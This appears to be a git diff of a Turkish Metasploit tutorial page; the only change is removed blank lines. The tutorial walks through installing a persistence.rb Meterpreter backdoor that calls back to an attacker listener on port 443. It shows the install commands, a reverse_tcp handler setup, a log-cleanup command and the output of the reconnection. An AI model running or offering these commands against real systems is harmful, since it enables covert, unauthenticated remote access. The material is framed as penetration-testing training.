@@ -16,27 +16,15 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 ## Persistence.rb
-
-
 
 Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework içinde kullanabileceğiniz bir diğer yöntem de `persistence.rb` script kodunu kullanmaktır.
 
-
-
 Bu yöntem sayesinde, hedef bilgisayar güncellense bile tekrar bağlanma imkanınız bulunmaktadır. Ayrıca, hedef sistemin tekrar başlatılması da bağlantı yapmayı etkilemeyecektir.
-
-
 
 Bir önceki konuda, `metsvc` için yaptığımız uyarıyı burada da tekrarlayalım. `persistence.rb` arka kapısı, bağlantı için herhangi bir oturum bilgisi kullanmaz. Bu açıklığı keşfeden herkes bağlantı sağlayabilir.
 
-
-
 Hedef sistemde meterpreter oturum açtıktan sonra `persistence.rb` script kodunu kullanmadan önce yardım bilgilerini görüntüleyelim ve bize hangi imkanları sağladığını görelim.
-
-
 ```bash
 meterpreter > run persistence -h
 
@@ -59,27 +47,15 @@ OPTIONS:
     -r   The IP of the system running Metasploit listening for the connect back
 ```
 
-
-
 Aşağıdaki `persistence -U -i 5 -p 443 -r 192.168.1.71` komutu hangi işlemleri yapıyor?
-
-
 
 `-U`, bir kullanıcı oturum açtığında bizim bilgisayarımıza otomatik bağlantı yapılmasını sağlar.
 
-
-
 `-i 5` Karşe taraftaki `persistence.rb` script kodu her 5 saniyede bir bize bağlanmaya çalışır.
-
-
 
 `-p 443` bizim dinleme yapan bilgisayarımızın dinleme yaptığı port numarasıdır.
 
-
-
 `-r 192.168.1.71` bizim dinleme yapan bilgisayarımızın IP numarasıdır.
-
-
 ```bash
 meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
 > Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
@@ -92,20 +68,12 @@ meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
 meterpreter >
 ```
 
-
-
 Verdiğimiz komut sonucunda başlatılan script, çıktılarda da görüleceği gibi işimiz tamamlandığında log temizleme işleminin nasıl yapılabileceğini de gösteriyor.
-
-
 ```bash
 multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
 ```
 
-
-
 Scriptin çalışıp çalışmadığını ve otomatik bağlantı yapıp yapmadığını, hedef bilgisayarı tekrar başlatarak anlayabiliriz. Hedef bilgisayarı yeniden başlatalım.
-
-
 ```bash
 meterpreter > reboot
 Rebooting...
@@ -114,11 +82,7 @@ meterpreter > exit
 > Meterpreter session 3 closed.  Reason: User exit
 ```
 
-
-
 Dinleyici `exploit/multi/handler` modülünü tekrar başlatalım.
-
-
 ```bash
 msf exploit(ms08_067_netapi) > use exploit/multi/handler
 msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
@@ -133,11 +97,7 @@ msf exploit(handler) > exploit
 > Starting the payload handler...
 ```
 
-
-
 Hedef bilgisayar tekrar başladığında, oturum açılır açılmaz yerel bilgisayara bağlantı, aşağıda görüldüğü gibi tekrar sağlanacaktır.
-
-
 ```bash
 > Sending stage (748544 bytes) to 192.168.1.161
 > Meterpreter session 5 opened (192.168.1.71:443 -> 192.168.1.161:1045) at 2010-08-21 12:31:42 -0600
